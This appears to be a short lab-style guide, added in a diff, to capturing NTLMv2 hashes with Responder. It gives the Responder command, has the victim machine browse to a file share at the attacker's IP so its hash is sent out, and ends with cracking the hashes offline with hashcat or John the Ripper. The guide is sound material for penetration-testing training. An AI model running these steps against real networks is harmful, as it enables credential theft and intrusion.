@@ -1,0 +1,22 @@
+You will need:
+
+- Responder running on the attacking machine
+- Access to the victims machines file explorer because you need to direct traffic to your attacking machine.
+- The attacking machines IP address
+
+Steps:
+
+1. Run responder - Responder on your attacking machine will respond to traffic from the target machine:
+    
+    
+    $ `Sudo responder -I tun0 –dPv`
+    
+    Ensure that all the servers present-as-on in the responder output. If you need to edit the servers search for the servers with `locate responder` or `locate Responder` and look for the .conf file. Then `sudo nano Responder.conf`
+    
+2. We are simulating traffic – Go to a file share that points to our attacker IP address. We are causing an event to occur. In theory we are pointing the target machine at responder. In the victim machine, in the file explorer address bar, enter your attacking machines ip `\\attackers_ip`
+
+3. Check back on your Kali machine in the responder output. We should see a hash come through meaning we have captured an NTLMv2 hash.
+    
+    In the capture we can also see the host IP address and host machines name.
+
+4. Crack hashes offline using hashcat or John the ripper. 
